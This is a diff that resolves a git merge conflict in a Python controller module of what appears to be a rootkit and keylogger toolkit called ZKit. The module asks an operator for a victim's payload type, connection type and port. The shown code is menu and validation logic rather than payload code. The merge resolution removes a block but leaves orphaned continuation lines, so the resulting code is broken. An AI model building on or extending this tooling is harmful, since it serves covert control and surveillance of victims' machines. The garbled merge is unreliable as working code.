@@ -1,5 +1,4 @@
 "Talks to controllers"
-<<<<<<< HEAD
 
 import os
 import core.lib.controllers.rootkit_controller as r_ctrl
@@ -74,36 +73,8 @@ class Main:
         "validates data from user"
         conn, port, type_ = con_tuple
         return conn in ["TCP", "UDP"] and isinstance(port, int) and type_ in ["ft", "rootkit", "keylogger"]
-=======
-import os
-import core.lib.controllers.rootkit_controller as ctrl
-from core.helper_core import Color, notify
 
 
-def main():
-    "Talks to controllers . gets info from user and lets user have fun"
-    if os.name == 'nt':
-        from colorama import init  # pylint: disable=C0415; # noqa
-        init(convert=True)
-    col = Color().GetColor
-    red, green, blue, reset = col('red'), col('green'), col("blue"), col("reset")
-    print("What Is The Victims PayLoad ?\n"
-          + red + "{1}--> Rootkit\n"
-          + green + "{2}--> KeyLogger*\n"
-          + blue + "{000}--> Back To Main Menu\n" + reset)
-    choice = str(input("..> "))
-    if choice == "000":
-        pass
-    elif choice == "1":
-        print("At The Time Of Creation Of Rootkit . ZKit Asked About A Connection Type "
-              "What Was It ?\n"
-              + red + "{1}--> TCP\n"
-              + green + "{2}--> UDP\n"
-              + blue + "{000}--> Back To Main Menu" + reset)
-        choice = str(input("..> "))
-        notify("question", "what port did you used ? left empty to use default (1534)")
-        port = int(input("..> "))
-        type_ = 'ft' if input(
             "Was the payload enchanted with file transfer (Y or N)").lower() == 'y' else 'rootkit'
         if choice == "000":
             pass
@@ -114,4 +85,3 @@ def main():
     else:
         notify("notify",
                "Invalid Input {" + "{}".format(choice) + "}")
->>>>>>> 347fd8cbf931367e46eceb0af7f98194c1e382f5
